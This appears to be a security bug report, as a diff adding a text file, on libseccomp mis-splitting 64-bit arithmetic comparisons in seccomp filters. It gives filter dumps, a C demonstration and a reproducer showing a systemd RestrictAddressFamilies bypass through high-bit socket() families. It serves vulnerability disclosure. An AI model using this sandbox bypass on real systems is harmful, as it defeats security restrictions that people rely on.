@@ -1,0 +1,282 @@
+When libseccomp compiles filters for 64-bit systems, it needs to split 64-bit
+comparisons into 32-bit comparisons because classic BPF can't operate on 64-bit
+values directly.
+
+libseccomp offers both bitwise comparisons (NE, EQ, MASKED_EQ) and arithmetic
+comparisons (LT, LE, GE, GT). Bitwise comparisons can always be implemented with
+no more than two comparisons; but that doesn't work for arithmetic comparisons.
+
+Consider the case where a filter attempts to check whether
+args[0]<0x123456789abc. The cases are:
+
+args[0].high < 0x1234:                               matches
+args[0].high > 0x1234:                               no match
+args[0].high == 0x1234 && args[0].low < 0x56789abc:  matches
+args[0].high == 0x1234 && args[0].low >= 0x56789abc: no match
+
+So in pseudocode, you'd want something like the following:
+
+if args[0].high < 0x1234
+  return ACCEPT
+if args[0].high > 0x1234
+  return REJECT
+if args[0].low < 0x56789abc
+  return ACCEPT
+return REJECT
+
+
+But actually, when libseccomp is invoked as follows:
+
+  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
+  if (ctx == NULL) err(1, "seccomp_init");
+  if (seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADSLT), SCMP_SYS(mincore), 1,
+                       SCMP_A0(SCMP_CMP_LT, 0x123456789abcUL)))
+    err(1, "seccomp_rule_add");
+  if (seccomp_load(ctx))
+    err(1, "seccomp_load");
+
+it generates the following seccomp filter:
+
+# ./seccomp_dump 96148 simple
+===== filter 0 (13 instructions) =====
+0001 if arch != X86_64: [true +10, false +0] -> ret KILL
+0003 if nr < 0x40000000: [true +1, false +0]
+0005   if nr != 0x0000001b: [true +5, false +0] -> ret ALLOW (syscalls: <TOO MANY TO LIST>)
+0007   if args[0].high < 0x00001234: [true +2, false +0] -> ret ERRNO
+0009   if args[0].low >= 0x56789abc: [true +1, false +0] -> ret ALLOW (syscalls: mincore)
+000a   ret ERRNO
+[...]
+
+As you can see, the case of `args[0].high > 0x1234 && args[0].low < 0x56789abc`
+is handled incorrectly.
+
+
+
+Here's a demo, tested with libseccomp from git master:
+===========================================
+jannh@jannh2:~/tests/libseccomp-stuff$ cat compare.c
+#include <seccomp.h>
+#include <err.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <errno.h>
+#include <sys/mman.h>
+
+// any mincore() starting below this address should be denied with -EBADSLT
+#define ADDR_LIMIT 0x123456789abcUL
+
+static void sctest(unsigned long addr) {
+  unsigned char vec;
+  printf("mincore(0x%012lx, 0) = ", addr);
+  int res = mincore((void*)addr, 0, &vec);
+  if (res == 0) {
+    printf(" 0\n");
+  } else {
+    printf("-%d (%m)\n", errno);
+  }
+}
+
+int main(int argc, char **argv) {
+  setbuf(stdout, NULL);
+  printf("my pid is %d\n", (int)getpid());
+  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
+  if (ctx == NULL) err(1, "seccomp_init");
+  if (seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADSLT), SCMP_SYS(mincore), 1,
+                       SCMP_A0(SCMP_CMP_LT, ADDR_LIMIT)))
+    err(1, "seccomp_rule_add");
+  if (seccomp_load(ctx))
+    err(1, "seccomp_load");
+
+  sctest(0);
+  sctest(0x123000000000);
+  sctest(0x1230f0000000);
+  sctest(0x123400000000);
+  sctest(0x123450000000);
+  sctest(0x123460000000);
+  sctest(0x1234f0000000);
+  sctest(0x123500000000);
+  sctest(0x1235f0000000);
+  sctest(0x123600000000);
+
+  while (1) pause();
+}
+jannh@jannh2:~/tests/libseccomp-stuff$ gcc -o compare compare.c -Wall -I/h/git/foreign/libseccomp/include/ -L/h/git/foreign/libseccomp/src/.libs -lseccomp -Wl,-rpath /h/git/foreign/libseccomp/src/.libs/
+jannh@jannh2:~/tests/libseccomp-stuff$ ./compare 
+my pid is 104373
+mincore(0x000000000000, 0) = -57 (Invalid slot)
+mincore(0x123000000000, 0) = -57 (Invalid slot)
+mincore(0x1230f0000000, 0) = -57 (Invalid slot)
+mincore(0x123400000000, 0) = -57 (Invalid slot)
+mincore(0x123450000000, 0) = -57 (Invalid slot)
+mincore(0x123460000000, 0) =  0
+mincore(0x1234f0000000, 0) =  0
+mincore(0x123500000000, 0) = -57 (Invalid slot)
+mincore(0x1235f0000000, 0) =  0
+mincore(0x123600000000, 0) = -57 (Invalid slot)
+===========================================
+
+
+This probably isn't terribly interesting for most users of libseccomp, but the
+Tor daemon
+(https://gitweb.torproject.org/tor.git/tree/src/lib/sandbox/sandbox.c) does use
+arithmetic comparisons to prevent writes to a certain memory region:
+
+===========================================
+  /*
+   * Allow mprotect with PROT_READ|PROT_WRITE because openssl uses it, but
+   * never over the memory region used by the protected strings.
+   *
+   * PROT_READ|PROT_WRITE was originally fully allowed in sb_mprotect(), but
+   * had to be removed due to limitation of libseccomp regarding intervals.
+   *
+   * There is a restriction on how much you can mprotect with R|W up to the
+   * size of the canary.
+   */
+  ret = seccomp_rule_add_3(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect),
+      SCMP_CMP(0, SCMP_CMP_LT, (intptr_t) pr_mem_base),
+      SCMP_CMP(1, SCMP_CMP_LE, MALLOC_MP_LIM),
+      SCMP_CMP(2, SCMP_CMP_EQ, PROT_READ|PROT_WRITE));
+[...]
+  ret = seccomp_rule_add_3(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect),
+      SCMP_CMP(0, SCMP_CMP_GT, (intptr_t) pr_mem_base + pr_mem_size +
+          MALLOC_MP_LIM),
+      SCMP_CMP(1, SCMP_CMP_LE, MALLOC_MP_LIM),
+      SCMP_CMP(2, SCMP_CMP_EQ, PROT_READ|PROT_WRITE));
+[...]
+===========================================
+
+systemd also has some code that uses arithmetic comparisons in
+https://github.com/systemd/systemd/blob/master/src/shared/seccomp-util.c ,
+specifically for two purposes:
+
+ - If you whitelist a range of address families for socket() using
+   RestrictAddressFamilies, anything outside that range gets blocked with
+   SCMP_CMP_LT/SCMP_CMP_GT.
+ - If you restrict the use of scheduling classes, anything above the permitted
+   class is blocked via SCMP_CMP_GT.
+
+(Both of these, by the way, are for syscalls that silently discard the upper 32
+bits of their arguments.)
+
+The start of the second seccomp filter generated for a systemd unit with
+"RestrictAddressFamilies=AF_INET AF_INET6" is:
+
+===== filter 1 (57 instructions) =====
+0001 if arch != X86_64: [true +54, false +0] -> ret ALLOW (syscalls: <TOO MANY TO LIST>)
+0003 if nr < 0x40000000: [true +1, false +0]
+0005   if nr != 0x00000029: [true +50, false +0] -> ret ALLOW (syscalls: <TOO MANY TO LIST>)
+0007   if args[0].high != 0x00000000: [true +42, false +0]
+0033     if args[0].high < 0x00000000: [true +3, false +0] -> ret ERRNO
+0035     if args[0].low > 0x0000000a: [true +1, false +0] -> ret ERRNO
+0036     if args[0].low >= 0x00000002: [true +1, false +0] -> ret ALLOW (syscalls: socket)
+0037     ret ERRNO
+
+So this filter will e.g. permit socket() calls in the range from 0x100000002 to
+0x10000000a (and the kernel will ignore the high bit, meaning that in effect,
+this filter grants access to families like AF_AX25); but as far as I can tell,
+the other filter installed by systemd prevents this.
+
+
+In the open-source users of libseccomp that I have been able to find on
+codesearch.debian.net, this issue doesn't seem to have significant
+impact; but someone might rely on this behavior, so I've decided to treat this
+as a security bug.
+
+##############################
+
+ Oh, I misread the other filter; that one applies to X32 only. So this actually has impact against systemd.
+
+To reproduce on a Debian 10 machine:
+
+Compile the following as /home/user/pause:
+==========
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/socket.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <stdio.h>
+
+void try_socket(unsigned long family) {
+  errno = 0;
+  int res = syscall(SYS_socket, family, SOCK_STREAM, 0);
+  printf("socket for family 0x%lx: %d (%m)\n", family, res);
+  if (res >= 0) close(res);
+}
+
+int main(void) {
+  setbuf(stdout, NULL);
+  for (unsigned int i=0; i<20; i++) {
+    try_socket(i);
+    try_socket(i | 0x100000000UL);
+  }
+  while(1) pause();
+}
+==========
+
+Create a systemd user service as follows:
+==========
+ser@deb10:~$ cat > .config/systemd/user/addrfam.service
+[Unit]
+Description=addrfam test
+
+[Service]
+ExecStart=/home/user/pause
+RestrictAddressFamilies=AF_INET AF_INET6
+SystemCallArchitectures=native
+
+[Install]
+WantedBy=default.target
+user@deb10:~$ systemctl --user enable addrfam.service
+Created symlink /home/user/.config/systemd/user/default.target.wants/addrfam.service → /home/user/.config/systemd/user/addrfam.service.
+user@deb10:~$ systemctl --user start addrfam.service
+user@deb10:~$
+==========
+
+And now look at "sudo journalctl | grep pause":
+==========
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x0: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000000: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x1: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000001: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x2: 3 (Success)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000002: 3 (Success)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x3: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000003: -1 (Socket type not supported)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x4: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000004: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x5: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000005: -1 (Socket type not supported)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x6: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000006: -1 (Socket type not supported)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x7: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000007: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x8: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000008: -1 (Invalid argument)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x9: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000009: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xa: 3 (Success)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000a: 3 (Success)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xb: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000b: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xc: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000c: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xd: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000d: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xe: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000e: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0xf: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10000000f: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x10: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000010: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x11: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000011: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x12: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000012: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x13: -1 (Address family not supported by protocol)
+Jan 31 01:09:11 deb10 pause[17824]: socket for family 0x100000013: -1 (Address family not supported by protocol)
+==========
+
+As you can see, the normal socket() calls return "-1 (Address family not supported by protocol)" for everything other than AF_INET and AF_INET6; but with a bit set in the high half, e.g. AF_AX25 also works (returning "-1 (Socket type not supported)").
